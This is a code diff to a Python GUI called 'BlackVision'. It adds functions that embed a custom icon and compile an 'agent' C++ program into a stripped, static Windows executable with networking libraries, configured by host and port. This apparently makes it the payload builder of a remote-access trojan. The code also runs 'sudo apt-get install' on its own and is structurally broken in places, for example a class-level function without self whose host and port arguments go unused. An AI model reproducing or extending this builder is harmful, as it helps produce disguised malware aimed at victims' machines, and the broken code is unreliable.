@@ -13,6 +13,64 @@ import os
 
 class GUI:
     def __init__(self, master):
+        
+        def rc_generate(filename, iconpath):
+            with open(filename+".rc", "w+") as rcfile:
+                rcfile.write('id ICON "'+iconpath+'"')
+            if(os.name == "nt"):
+                if(exeCheck("windres") == True):
+                    winrescmd = "windres "+filename+".rc" +" -O coff -o "+filename+".res"
+                    os.system(winrescmd)
+                else:
+                    print("Mingw is not properly installed or NOT availabe in PATH.")
+                    print("[-] Please install Mingw Compiler (http://www.mingw.org/)")
+                    showError("Built Failed!\nMingw is not properly installed or NOT availabe in PATH.\nPlease install Mingw Compiler (http://www.mingw.org/)")
+            else:
+                if(exeCheck("i686-w64-mingw32-windres") == True):
+                    cmd = "i686-w64-mingw32-windres "+filename+".rc" +" -O coff -o "+filename+".res"
+                    os.system(cmd)
+
+
+    def generate(host, port, lfilename):
+
+        filename = lfilename+".exe"
+        if(os.name == "nt"):
+            if(exeCheck("g++") == True):
+                print("[+] Generating Executable..")
+                # First Change Host and Port then continue
+                wincmd = "g++ agent/main.cpp agent/blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -lwinmm -static " +lfilename+".res"
+                os.system(wincmd)
+                print("[+] File Compiled..")
+                showInfo("Build succeeded!")
+            else :
+                print("[-] Please install Mingw Compiler (http://www.mingw.org/)")
+                showError("Please install Mingw Compiler (http://www.mingw.org/)")
+        else:
+            if(exeCheck("i686-w64-mingw32-g++") == True):
+                print("[+] Generating Executable..")
+                cmd = "i686-w64-mingw32-g++ agent/main.cpp agent/blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -lwinmm -static " +lfilename+".res"
+                os.system(cmd)
+                print("[+] File Compiled..")
+                showInfo("Build succeeded!")
+
+            else:
+                print("[+] Attempting to Install mingw..")
+                showInfo("Mingw not installed, Installing...")
+                os.system("sudo apt-get install mingw-w64")
+
+
+
+        def showError(errormessage):
+            """ Show an Error MessageBox """
+            messagebox.showerror("BlackVision", errormessage)
+
+        def showInfo(infomessage):
+            """ Show an Information MessageBox """
+            messagebox.showinfo("BlackVision", infomessage)
+
+        def showWarning(warning):
+            """ Show an Information MessageBox """
+            messagebox.showwarning("BlackVision", warning)
 
         def create_file(file):
             showInfo("Please wait a few seconds..")
